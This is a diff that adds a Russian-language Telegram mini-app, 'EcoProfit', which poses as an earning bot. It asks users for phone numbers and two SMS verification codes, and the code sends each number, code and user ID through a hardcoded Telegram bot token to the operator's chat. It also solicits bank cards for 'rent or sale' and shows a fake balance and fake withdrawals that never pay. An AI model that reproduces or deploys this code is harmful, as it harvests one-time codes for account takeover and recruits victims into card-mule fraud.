@@ -1,0 +1,894 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>EcoProfit</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+    body {
+      background: #1a1a2e;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 10px;
+      position: relative;
+      overflow: hidden;
+    }
+    body::after {
+      content: "🌿";
+      font-size: 80px;
+      position: fixed;
+      bottom: 10px;
+      right: 10px;
+      opacity: 0.15;
+      pointer-events: none;
+      transform: rotate(15deg);
+      z-index: 0;
+    }
+    .app {
+      max-width: 400px;
+      width: 100%;
+      max-height: 96vh;
+      background: #16213e;
+      border-radius: 28px;
+      overflow: hidden;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+      color: #fff;
+      position: relative;
+      z-index: 1;
+      display: flex;
+      flex-direction: column;
+    }
+    .header {
+      background: #0f3460;
+      padding: 18px 20px 12px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid #1a4a7a;
+      flex-shrink: 0;
+    }
+    .header h1 {
+      font-size: 22px;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+      background: linear-gradient(90deg, #f5af19, #f12711);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      cursor: pointer;
+    }
+    .header .badge {
+      font-size: 12px;
+      background: #e94560;
+      padding: 4px 12px;
+      border-radius: 20px;
+      color: #fff;
+      font-weight: 600;
+    }
+    .balance-bar {
+      background: #1a1a3e;
+      padding: 12px 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid #2a2a5a;
+      cursor: pointer;
+      flex-shrink: 0;
+    }
+    .balance-bar .label {
+      font-size: 14px;
+      color: #aaa;
+    }
+    .balance-bar .amount {
+      font-size: 20px;
+      font-weight: 700;
+      color: #4ef0a0;
+    }
+    .menu-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 10px;
+      padding: 16px 16px 10px;
+      background: #0d1b3e;
+      flex-shrink: 0;
+    }
+    .menu-btn {
+      background: #1f3a6b;
+      border: none;
+      border-radius: 14px;
+      padding: 14px 6px;
+      color: #fff;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: 0.2s;
+      text-align: center;
+      box-shadow: 0 4px 0 #0b1a33;
+    }
+    .menu-btn:active {
+      transform: translateY(3px);
+      box-shadow: 0 1px 0 #0b1a33;
+    }
+    .menu-btn .icon {
+      display: block;
+      font-size: 24px;
+      margin-bottom: 4px;
+    }
+    .menu-btn.full-width {
+      grid-column: span 2;
+    }
+    .content {
+      padding: 16px 18px 20px;
+      background: #16213e;
+      flex: 1;
+      overflow-y: auto;
+      max-height: 50vh; /* увеличил для удобства прокрутки */
+      scroll-behavior: smooth;
+      -webkit-overflow-scrolling: touch;
+    }
+    .page {
+      display: none;
+      animation: fade 0.25s ease;
+    }
+    .page.active {
+      display: block;
+    }
+    @keyframes fade {
+      from { opacity: 0.5; transform: translateY(6px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .page h2 {
+      font-size: 18px;
+      margin-bottom: 12px;
+      color: #f5af19;
+    }
+    .page p, .page li {
+      font-size: 14px;
+      line-height: 1.6;
+      color: #ccc;
+      margin-bottom: 10px;
+    }
+    .page .highlight {
+      background: #1f3a6b;
+      padding: 10px 14px;
+      border-radius: 12px;
+      margin: 12px 0;
+      border-left: 3px solid #f5af19;
+    }
+    .back-btn {
+      background: #2a2a5a;
+      border: none;
+      border-radius: 30px;
+      padding: 10px 20px;
+      color: #fff;
+      font-weight: 600;
+      font-size: 14px;
+      cursor: pointer;
+      margin-top: 16px;
+      transition: 0.2s;
+      width: 100%;
+      text-align: center;
+    }
+    .back-btn:active {
+      background: #3a3a7a;
+    }
+    .step {
+      display: none;
+      animation: fade 0.2s ease;
+    }
+    .step.active {
+      display: block;
+    }
+    .step-label {
+      font-size: 15px;
+      font-weight: 500;
+      margin-bottom: 6px;
+      color: #e0e0e0;
+    }
+    .step-input {
+      width: 100%;
+      padding: 12px 14px;
+      border-radius: 12px;
+      border: 1px solid #2a4a7a;
+      background: #0f1f3f;
+      color: #fff;
+      font-size: 16px;
+      outline: none;
+      transition: 0.2s;
+      margin-bottom: 12px;
+    }
+    .step-input:focus {
+      border-color: #f5af19;
+      box-shadow: 0 0 0 2px rgba(245, 175, 25, 0.3);
+    }
+    .step-input::placeholder {
+      color: #667;
+    }
+    .operator-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 8px;
+      margin: 12px 0;
+    }
+    .operator-btn {
+      background: #1f3a6b;
+      border: none;
+      border-radius: 12px;
+      padding: 12px 0;
+      color: #fff;
+      font-weight: 600;
+      font-size: 14px;
+      cursor: pointer;
+      transition: 0.2s;
+      box-shadow: 0 3px 0 #0b1a33;
+    }
+    .operator-btn:active {
+      transform: translateY(3px);
+      box-shadow: 0 1px 0 #0b1a33;
+    }
+    .operator-btn.selected {
+      background: #f5af19;
+      color: #1a1a2e;
+      box-shadow: 0 3px 0 #b87d10;
+    }
+    .success-msg {
+      background: #1a4a3a;
+      padding: 14px;
+      border-radius: 12px;
+      border-left: 4px solid #4ef0a0;
+      color: #d4f0e0;
+      margin: 12px 0;
+      font-size: 15px;
+    }
+    .success-msg strong {
+      color: #4ef0a0;
+    }
+    .info-block {
+      background: #0f1f3f;
+      padding: 12px 14px;
+      border-radius: 12px;
+      margin-bottom: 14px;
+      border-left: 3px solid #f5af19;
+    }
+    .info-block h3 {
+      font-size: 16px;
+      color: #f5af19;
+      margin-bottom: 6px;
+    }
+    .info-block p {
+      font-size: 13px;
+      color: #bbb;
+      margin-bottom: 4px;
+    }
+    .info-block strong {
+      color: #fff;
+    }
+    .balance-large {
+      font-size: 42px;
+      font-weight: 700;
+      color: #4ef0a0;
+      text-align: center;
+      margin: 20px 0 10px;
+      letter-spacing: 1px;
+    }
+    .balance-small {
+      text-align: center;
+      color: #aaa;
+      font-size: 14px;
+    }
+    .price-item {
+      background: #0f1f3f;
+      padding: 12px 16px;
+      border-radius: 12px;
+      margin-bottom: 10px;
+      border-left: 3px solid #f5af19;
+    }
+    .price-item .service {
+      font-weight: 600;
+      color: #f5af19;
+    }
+    .price-item .cost {
+      float: right;
+      color: #4ef0a0;
+      font-weight: 700;
+    }
+    .footer {
+      text-align: center;
+      font-size: 11px;
+      color: #666;
+      padding: 14px 0 10px;
+      border-top: 1px solid #1f2a4a;
+      flex-shrink: 0;
+    }
+    .footer a {
+      color: #f5af19;
+      text-decoration: none;
+    }
+    /* Админ-панель */
+    .admin-table {
+      width: 100%;
+      font-size: 12px;
+      border-collapse: collapse;
+    }
+    .admin-table th, .admin-table td {
+      padding: 6px 8px;
+      border-bottom: 1px solid #2a3a5a;
+      text-align: left;
+      color: #ccc;
+    }
+    .admin-table th {
+      color: #f5af19;
+    }
+    .admin-table .empty {
+      text-align: center;
+      color: #666;
+      padding: 20px 0;
+    }
+  </style>
+</head>
+<body>
+<div class="app" id="app">
+
+  <div class="header">
+    <h1 id="logoTitle">EcoProfit</h1>
+    <span class="badge">бот</span>
+  </div>
+
+  <div class="balance-bar" id="balanceBar">
+    <span class="label">💰 Ваш баланс:</span>
+    <span class="amount" id="balanceDisplay">$ 0.00</span>
+  </div>
+
+  <div class="menu-grid">
+    <button class="menu-btn" data-page="numbers"><span class="icon">📱</span> Сдача номеров</button>
+    <button class="menu-btn" data-page="mts"><span class="icon">📞</span> МТС "Звонки"</button>
+    <button class="menu-btn" data-page="cards"><span class="icon">💳</span> Сдача карт</button>
+    <button class="menu-btn" data-page="info"><span class="icon">ℹ️</span> Информация</button>
+    <button class="menu-btn" data-page="balance"><span class="icon">💰</span> Баланс</button>
+    <button class="menu-btn" data-page="withdraw"><span class="icon">💸</span> Вывод средств</button>
+    <button class="menu-btn" data-page="prices"><span class="icon">📊</span> Прайс</button>
+    <button class="menu-btn full-width" data-page="support"><span class="icon">🛟</span> Поддержка</button>
+  </div>
+
+  <div class="content">
+
+    <!-- ГЛАВНАЯ -->
+    <div id="page-main" class="page active">
+      <h2 id="greeting">Привет, Пользователь! 🎉</h2>
+      <p>Добро пожаловать в нашего бота!</p>
+      <div class="highlight">
+        Группа для вывода средств:<br>
+        <a href="https://t.me/withdrawal_of_funds_balance" target="_blank" style="color:#f5af19; text-decoration:underline;">t.me/withdrawal_of_funds_balance</a>
+      </div>
+      <p style="font-size:13px; color:#999;">Выберите раздел в меню выше.</p>
+    </div>
+
+    <!-- СДАЧА НОМЕРОВ -->
+    <div id="page-numbers" class="page">
+      <h2>📱 Сдача номеров</h2>
+      <div id="numbers-steps">
+        <div id="numbers-step0" class="step active">
+          <p>Выберите оператора (начисление +5$):</p>
+          <div class="operator-grid">
+            <button class="operator-btn" data-operator="МТС">МТС</button>
+            <button class="operator-btn" data-operator="Теле2">Теле2</button>
+            <button class="operator-btn" data-operator="Мегафон">Мегафон</button>
+          </div>
+          <button class="back-btn" data-back="main">← назад</button>
+        </div>
+        <div id="numbers-step1" class="step">
+          <div class="step-label">📱 Введите номер (можно с +7):</div>
+          <input type="tel" class="step-input" id="numbers-phone" placeholder="+7 900 123 45 67" inputmode="numeric">
+          <button class="back-btn" id="numbers-next1">Далее →</button>
+          <button class="back-btn" style="margin-top:8px;" data-back="main">← назад</button>
+        </div>
+        <div id="numbers-step2" class="step">
+          <div class="step-label">🔑 Введите первый код:</div>
+          <input type="text" class="step-input" id="numbers-code1" placeholder="Код из SMS" inputmode="numeric">
+          <button class="back-btn" id="numbers-next2">Далее →</button>
+          <button class="back-btn" style="margin-top:8px;" data-back="main">← назад</button>
+        </div>
+        <div id="numbers-step3" class="step">
+          <div class="step-label">🔑 Введите второй код:</div>
+          <input type="text" class="step-input" id="numbers-code2" placeholder="Код из SMS" inputmode="numeric">
+          <button class="back-btn" id="numbers-next3">Далее →</button>
+          <button class="back-btn" style="margin-top:8px;" data-back="main">← назад</button>
+        </div>
+        <div id="numbers-step4" class="step">
+          <div class="success-msg">
+            ✅ <strong>Номер и коды приняты!</strong><br>
+            На ваш баланс начислено <strong>+5$</strong>.<br>
+            Ожидайте начисления с 22:00 до 00:00 МСК.
+          </div>
+          <button class="back-btn" data-back="main">← в главное меню</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- МТС ЗВОНКИ -->
+    <div id="page-mts" class="page">
+      <h2>📞 МТС «Звонки через мой МТС»</h2>
+      <div id="mts-steps">
+        <div id="mts-step1" class="step active">
+          <div class="step-label">📱 Введите номер (можно с +7) – начисление +15$:</div>
+          <input type="tel" class="step-input" id="mts-phone" placeholder="+7 900 123 45 67" inputmode="numeric">
+          <button class="back-btn" id="mts-next1">Далее →</button>
+          <button class="back-btn" style="margin-top:8px;" data-back="main">← назад</button>
+        </div>
+        <div id="mts-step2" class="step">
+          <div class="step-label">🔑 Введите первый код:</div>
+          <input type="text" class="step-input" id="mts-code1" placeholder="Код из SMS" inputmode="numeric">
+          <button class="back-btn" id="mts-next2">Далее →</button>
+          <button class="back-btn" style="margin-top:8px;" data-back="main">← назад</button>
+        </div>
+        <div id="mts-step3" class="step">
+          <div class="step-label">🔑 Введите второй код:</div>
+          <input type="text" class="step-input" id="mts-code2" placeholder="Код из SMS" inputmode="numeric">
+          <button class="back-btn" id="mts-next3">Далее →</button>
+          <button class="back-btn" style="margin-top:8px;" data-back="main">← назад</button>
+        </div>
+        <div id="mts-step4" class="step">
+          <div class="success-msg">
+            ✅ <strong>Номер и коды приняты!</strong><br>
+            На ваш баланс начислено <strong>+15$</strong>.<br>
+            Ожидайте начисления с 22:00 до 00:00 МСК.
+          </div>
+          <button class="back-btn" data-back="main">← в главное меню</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- СДАЧА КАРТ -->
+    <div id="page-cards" class="page">
+      <h2>💳 Сдача карт</h2>
+      <div class="highlight">
+        💳 Для сдачи карты пишите <strong>@Safe_Bont</strong>.<br>
+        Карты принимаются только вручную!
+      </div>
+      <button class="back-btn" data-back="main">← назад</button>
+    </div>
+
+    <!-- ИНФОРМАЦИЯ -->
+    <div id="page-info" class="page">
+      <h2>ℹ️ Информация</h2>
+      <div class="info-block">
+        <h3>📱 Сдача номеров</h3>
+        <p><strong>1.1</strong> Для чего используются номера?</p>
+        <p><strong>1.2</strong> Мы используем ваши номера для регистрации на различных сайтах.</p>
+        <p><strong>1.3</strong> Ваши номера помогают нам увеличивать количество пользователей.</p>
+      </div>
+      <div class="info-block">
+        <h3>💳 Сдача карт</h3>
+        <p><strong>2.1</strong> Для чего используются карты?</p>
+        <p><strong>2.2</strong> Мы предлагаем аренду или покупку ваших карт на постоянной основе.</p>
+        <p><strong>2.3</strong> Каждая карта имеет лимит на вывод.</p>
+      </div>
+      <div class="info-block">
+        <h3>📞 Услуга МТС</h3>
+        <p><strong>3.1</strong> Мы подключаем ваш аккаунт МТС с услугой «Звонки через мой МТС» к нашей базе.</p>
+        <p><strong>3.2</strong> Пользователи МТС могут оформить услугу по нашей ссылке и получить бонус.</p>
+      </div>
+      <button class="back-btn" data-back="main">← назад</button>
+    </div>
+
+    <!-- БАЛАНС -->
+    <div id="page-balance" class="page">
+      <h2>💰 Ваш баланс</h2>
+      <div class="balance-large" id="balanceLarge">$ 0.00</div>
+      <p class="balance-small">Баланс пополняется автоматически за сдачу номеров и МТС услуги.</p>
+      <button class="back-btn" data-back="main">← назад</button>
+    </div>
+
+    <!-- ВЫВОД -->
+    <div id="page-withdraw" class="page">
+      <h2>💸 Вывод средств</h2>
+      <div id="withdraw-steps">
+        <div id="withdraw-step1" class="step active">
+          <div class="step-label">💰 Сумма вывода ($):</div>
+          <input type="number" class="step-input" id="withdraw-amount" placeholder="100" min="0" step="0.01">
+          <button class="back-btn" id="withdraw-next">Оформить →</button>
+          <button class="back-btn" style="margin-top:8px;" data-back="main">← назад</button>
+        </div>
+        <div id="withdraw-step2" class="step">
+          <div class="success-msg">
+            💰 <strong>Заявка на вывод <span id="withdraw-sum-display">0</span> $ оформлена!</strong><br>
+            Средства будут отправлены в ближайшее время.
+          </div>
+          <button class="back-btn" data-back="main">← в главное меню</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- ПРАЙС -->
+    <div id="page-prices" class="page">
+      <h2>📊 Прайс-лист</h2>
+      <div class="price-item">
+        <span class="service">📱 Сдача номера (МТС/Теле2/Мегафон)</span>
+        <span class="cost">5$</span>
+      </div>
+      <div class="price-item">
+        <span class="service">📞 Услуга МТС «Звонки через мой МТС»</span>
+        <span class="cost">15$</span>
+      </div>
+      <div class="price-item">
+        <span class="service">💳 Сдача карт (аренда/покупка)</span>
+        <span class="cost">от 40 до 80$</span>
+      </div>
+      <p style="font-size:13px; color:#999; margin-top:10px;">Цены могут меняться, уточняйте у поддержки.</p>
+      <button class="back-btn" data-back="main">← назад</button>
+    </div>
+
+    <!-- ПОДДЕРЖКА -->
+    <div id="page-support" class="page">
+      <h2>🛟 Поддержка</h2>
+      <p>По всем вопросам обращайтесь:</p>
+      <div class="highlight">
+        <strong>@Safe_Bont</strong> – Telegram<br>
+        Или в нашу группу: <a href="https://t.me/withdrawal_of_funds_balance" target="_blank" style="color:#f5af19;">t.me/withdrawal_of_funds_balance</a>
+      </div>
+      <p>Мы отвечаем в течение 24 часов.</p>
+      <button class="back-btn" data-back="main">← назад</button>
+    </div>
+
+    <!-- СКРЫТАЯ АДМИНКА -->
+    <div id="page-admin" class="page">
+      <h2>👑 Админ-панель</h2>
+      <p style="font-size:13px; color:#aaa;">Список пользователей, которые использовали бота:</p>
+      <div id="adminUserList">
+        <table class="admin-table">
+          <thead><tr><th>ID</th><th>Имя</th><th>Юзернейм</th><th>Последнее действие</th></tr></thead>
+          <tbody id="adminTableBody">
+            <tr><td colspan="4" class="empty">Нет данных</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <button class="back-btn" data-back="main">← назад</button>
+    </div>
+
+  </div>
+
+  <div class="footer">
+    Бот сделан в <a href="#">PuzzleBot</a> 🎮<br>
+    <span style="font-size:10px;">Создай Чат-бот и Мини-приложение с 0 — Бесплатный курс 🎯</span>
+  </div>
+</div>
+
+<script>
+  // =============================================================
+  //  ТОКЕН БОТА И ВАШ ID (для дублирования уведомлений)
+  // =============================================================
+  const BOT_TOKEN = '8602354997:AAFc8VIxe65kDBwr6XjKByRH_ADY2TWmuA0';
+  const ADMIN_CHAT_ID = 6689561934; // Ваш ID – сюда будут дублироваться все уведомления
+
+  // ⚠️ ЗАМЕНИТЕ ЭТИ ДВА ID НА РЕАЛЬНЫЕ, КОГДА УЗНАЕТЕ ⚠️
+  const SAFE_BONT_CHAT_ID = 0;        // сюда вставьте числовой ID @Safe_Bont
+  const WITHDRAWAL_GROUP_CHAT_ID = 0; // сюда вставьте ID группы t.me/withdrawal_of_funds_balance
+  // =============================================================
+
+  // ----- 1. Пользователь и localStorage -----
+  let tgUser = { id: null, username: null, first_name: 'Пользователь' };
+
+  if (window.Telegram && Telegram.WebApp) {
+    const webApp = Telegram.WebApp;
+    if (webApp.initDataUnsafe && webApp.initDataUnsafe.user) {
+      const user = webApp.initDataUnsafe.user;
+      tgUser.id = user.id || null;
+      tgUser.username = user.username || null;
+      tgUser.first_name = user.first_name || 'Пользователь';
+    }
+    webApp.expand();
+  }
+
+  function saveUserToStorage() {
+    let users = JSON.parse(localStorage.getItem('ecoprofit_users') || '[]');
+    const existing = users.find(u => u.id === tgUser.id);
+    if (existing) {
+      existing.last_seen = new Date().toISOString();
+    } else {
+      users.push({
+        id: tgUser.id,
+        username: tgUser.username,
+        first_name: tgUser.first_name,
+        last_seen: new Date().toISOString()
+      });
+    }
+    localStorage.setItem('ecoprofit_users', JSON.stringify(users));
+  }
+  saveUserToStorage();
+
+  // Приветствие
+  const greetingElem = document.getElementById('greeting');
+  if (greetingElem) {
+    let name = tgUser.username ? '@' + tgUser.username : tgUser.first_name;
+    greetingElem.textContent = `Привет, ${name}! 🎉`;
+  }
+
+  // ----- 2. Навигация -----
+  const menuBtns = document.querySelectorAll('.menu-btn');
+  const backBtns = document.querySelectorAll('[data-back]');
+  const pages = document.querySelectorAll('.page');
+
+  function showPage(pageId) {
+    pages.forEach(p => p.classList.remove('active'));
+    const target = document.getElementById('page-' + pageId);
+    if (target) target.classList.add('active');
+    // Прокручиваем контент вверх
+    const content = document.querySelector('.content');
+    if (content) content.scrollTop = 0;
+  }
+
+  menuBtns.forEach(btn => {
+    btn.addEventListener('click', function() {
+      const page = this.dataset.page;
+      if (page) {
+        resetSteps('numbers');
+        resetSteps('mts');
+        resetSteps('withdraw');
+        showPage(page);
+      }
+    });
+  });
+
+  backBtns.forEach(btn => {
+    btn.addEventListener('click', function() {
+      const target = this.dataset.back;
+      if (target === 'main') {
+        resetSteps('numbers');
+        resetSteps('mts');
+        resetSteps('withdraw');
+        showPage('main');
+      } else {
+        showPage(target);
+      }
+    });
+  });
+
+  function resetSteps(prefix) {
+    const container = document.getElementById(prefix + '-steps');
+    if (!container) return;
+    const steps = container.querySelectorAll('.step');
+    steps.forEach((step, index) => {
+      step.classList.toggle('active', index === 0);
+    });
+    const inputs = container.querySelectorAll('input');
+    inputs.forEach(inp => inp.value = '');
+  }
+
+  function nextStep(prefix, currentStepNum) {
+    const container = document.getElementById(prefix + '-steps');
+    const steps = container.querySelectorAll('.step');
+    steps.forEach(step => step.classList.remove('active'));
+    const next = currentStepNum + 1;
+    if (next < steps.length) {
+      steps[next].classList.add('active');
+    }
+  }
+
+  // ----- 3. Отправка сообщений в Telegram (с дублированием админу) -----
+  function sendMessageToChat(chatId, text) {
+    if (!chatId || chatId === 0) {
+      console.warn('⚠️ Chat ID не задан, сообщение не отправлено.');
+      return;
+    }
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: text,
+        parse_mode: 'HTML'
+      })
+    })
+    .then(res => res.json())
+    .then(json => {
+      if (json.ok) {
+        console.log('✅ Сообщение отправлено в чат', chatId);
+      } else {
+        console.error('❌ Ошибка Telegram API:', json);
+      }
+    })
+    .catch(err => {
+      console.error('❌ Ошибка сети:', err);
+    });
+  }
+
+  // Универсальная отправка: в целевой чат (если задан) + дублирование админу
+  function sendNotification(targetChatId, text) {
+    // Отправляем в целевой чат
+    if (targetChatId && targetChatId !== 0) {
+      sendMessageToChat(targetChatId, text);
+    }
+    // Дублируем админу (всегда)
+    if (ADMIN_CHAT_ID && ADMIN_CHAT_ID !== 0) {
+      // Добавляем пометку, что это дубль
+      const adminText = text + '\n\n<code>(дубликат для админа)</code>';
+      sendMessageToChat(ADMIN_CHAT_ID, adminText);
+    }
+  }
+
+  // Формирование текста для заявки
+  function formatUserData(data) {
+    let text = `<b>📨 Новая заявка</b>\n`;
+    text += `<b>Услуга:</b> ${data.service}\n`;
+    if (data.operator) text += `<b>Оператор:</b> ${data.operator}\n`;
+    if (data.phone) text += `<b>Телефон:</b> ${data.phone}\n`;
+    if (data.code1) text += `<b>Код 1:</b> ${data.code1}\n`;
+    if (data.code2) text += `<b>Код 2:</b> ${data.code2}\n`;
+    text += `<b>Пользователь:</b> ${data.user.first_name} (@${data.user.username || 'нет'}) [ID: ${data.user.id || 'неизвестен'}]`;
+    return text;
+  }
+
+  // ----- 4. Баланс и начисления -----
+  let balance = 0.00;
+  const balanceDisplay = document.getElementById('balanceDisplay');
+  const balanceLarge = document.getElementById('balanceLarge');
+
+  function updateBalanceUI() {
+    const formatted = balance.toFixed(2);
+    balanceDisplay.textContent = '$ ' + formatted;
+    if (balanceLarge) balanceLarge.textContent = '$ ' + formatted;
+  }
+
+  function addBalance(amount) {
+    balance += amount;
+    updateBalanceUI();
+    console.log(`💰 Начислено $${amount}. Новый баланс: $${balance.toFixed(2)}`);
+  }
+
+  window.addBalance = addBalance;
+
+  document.getElementById('balanceBar').addEventListener('dblclick', function() {
+    const add = Math.floor(Math.random() * 30) + 1;
+    addBalance(add);
+    alert(`💰 Баланс пополнен на $${add} (демо)`);
+  });
+
+  updateBalanceUI();
+
+  // ----- 5. Сдача номеров (начисление +5$) -----
+  let numbersOperator = '';
+
+  document.querySelectorAll('#numbers-step0 .operator-btn').forEach(btn => {
+    btn.addEventListener('click', function() {
+      document.querySelectorAll('#numbers-step0 .operator-btn').forEach(b => b.classList.remove('selected'));
+      this.classList.add('selected');
+      numbersOperator = this.dataset.operator;
+      nextStep('numbers', 0);
+    });
+  });
+
+  // Валидация номера: удаляем все не-цифры и проверяем длину 11
+  function validatePhone(phone) {
+    const digits = phone.replace(/\D/g, '');
+    return digits.length === 11;
+  }
+
+  document.getElementById('numbers-next1').addEventListener('click', function() {
+    const phone = document.getElementById('numbers-phone').value.trim();
+    if (!validatePhone(phone)) {
+      alert('Введите корректный номер из 11 цифр (можно с +7).');
+      return;
+    }
+    nextStep('numbers', 1);
+  });
+
+  document.getElementById('numbers-next2').addEventListener('click', function() {
+    const code1 = document.getElementById('numbers-code1').value.trim();
+    if (!code1) { alert('Введите первый код.'); return; }
+    nextStep('numbers', 2);
+  });
+
+  document.getElementById('numbers-next3').addEventListener('click', function() {
+    const code2 = document.getElementById('numbers-code2').value.trim();
+    if (!code2) { alert('Введите второй код.'); return; }
+    const phone = document.getElementById('numbers-phone').value.trim();
+    const code1 = document.getElementById('numbers-code1').value.trim();
+    const data = {
+      service: 'Сдача номеров',
+      operator: numbersOperator,
+      phone: phone,
+      code1: code1,
+      code2: code2,
+      user: tgUser
+    };
+    const text = formatUserData(data);
+    // Отправляем @Safe_Bont и дублируем админу
+    sendNotification(SAFE_BONT_CHAT_ID, text);
+    // Начисляем 5$
+    addBalance(5);
+    nextStep('numbers', 3);
+  });
+
+  // ----- 6. МТС Звонки (начисление +15$) -----
+  document.getElementById('mts-next1').addEventListener('click', function() {
+    const phone = document.getElementById('mts-phone').value.trim();
+    if (!validatePhone(phone)) {
+      alert('Введите корректный номер из 11 цифр (можно с +7).');
+      return;
+    }
+    nextStep('mts', 1);
+  });
+
+  document.getElementById('mts-next2').addEventListener('click', function() {
+    const code1 = document.getElementById('mts-code1').value.trim();
+    if (!code1) { alert('Введите первый код.'); return; }
+    nextStep('mts', 2);
+  });
+
+  document.getElementById('mts-next3').addEventListener('click', function() {
+    const code2 = document.getElementById('mts-code2').value.trim();
+    if (!code2) { alert('Введите второй код.'); return; }
+    const phone = document.getElementById('mts-phone').value.trim();
+    const code1 = document.getElementById('mts-code1').value.trim();
+    const data = {
+      service: 'МТС "Звонки через мой МТС"',
+      phone: phone,
+      code1: code1,
+      code2: code2,
+      user: tgUser
+    };
+    const text = formatUserData(data);
+    sendNotification(SAFE_BONT_CHAT_ID, text);
+    addBalance(15);
+    nextStep('mts', 3);
+  });
+
+  // ----- 7. Вывод средств (отправка в группу + дубль админу) -----
+  document.getElementById('withdraw-next').addEventListener('click', function() {
+    const amount = parseFloat(document.getElementById('withdraw-amount').value);
+    if (isNaN(amount) || amount <= 0) {
+      alert('Введите сумму больше 0.');
+      return;
+    }
+    if (amount > balance) {
+      alert(`❌ Недостаточно средств! Баланс: $${balance.toFixed(2)}`);
+      return;
+    }
+    const text = `<b>💸 Заявка на вывод</b>\n` +
+                 `<b>Сумма:</b> $${amount}\n` +
+                 `<b>Пользователь:</b> ${tgUser.first_name} (@${tgUser.username || 'нет'}) [ID: ${tgUser.id || 'неизвестен'}]`;
+    sendNotification(WITHDRAWAL_GROUP_CHAT_ID, text);
+    document.getElementById('withdraw-sum-display').textContent = amount.toFixed(2);
+    nextStep('withdraw', 1);
+    // Баланс не списываем
+  });
+
+  // ----- 8. Админ-панель (двойной клик по логотипу) -----
+  document.getElementById('logoTitle').addEventListener('dblclick', function() {
+    showPage('admin');
+    renderAdminTable();
+  });
+
+  function renderAdminTable() {
+    const users = JSON.parse(localStorage.getItem('ecoprofit_users') || '[]');
+    const tbody = document.getElementById('adminTableBody');
+    if (users.length === 0) {
+      tbody.innerHTML = '<tr><td colspan="4" class="empty">Нет данных</td></tr>';
+      return;
+    }
+    tbody.innerHTML = users.map(u => `
+      <tr>
+        <td>${u.id || '—'}</td>
+        <td>${u.first_name || '—'}</td>
+        <td>${u.username ? '@' + u.username : '—'}</td>
+        <td>${u.last_seen ? new Date(u.last_seen).toLocaleString() : '—'}</td>
+      </tr>
+    `).join('');
+  }
+
+  console.log('✅ EcoProfit бот обновлён. Ваш ID вставлен для дублирования.');
+  console.log('👤 Пользователь:', tgUser);
+  console.log('💡 Для пополнения баланса вручную используйте в консоли: addBalance(сумма)');
+  console.log('🔐 Двойной клик на "EcoProfit" открывает админ-панель.');
+  console.log('⚠️ Замените SAFE_BONT_CHAT_ID и WITHDRAWAL_GROUP_CHAT_ID на реальные ID.');
+</script>
+</body>
+</html>
